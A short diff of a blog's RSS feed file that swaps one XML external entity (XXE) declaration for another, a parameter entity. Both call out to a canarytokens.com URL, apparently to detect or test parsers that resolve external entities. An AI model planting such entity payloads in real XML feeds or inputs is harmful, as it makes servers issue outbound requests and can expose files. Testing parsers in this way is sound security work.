@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "http://canarytokens.com/feedback/uyga7ppcdrgsav0nz96pohkvq/contact.php" >]>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "http://canarytokens.com/feedback/uyga7ppcdrgsav0nz96pohkvq/contact.php" >
+]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>The blog</title>
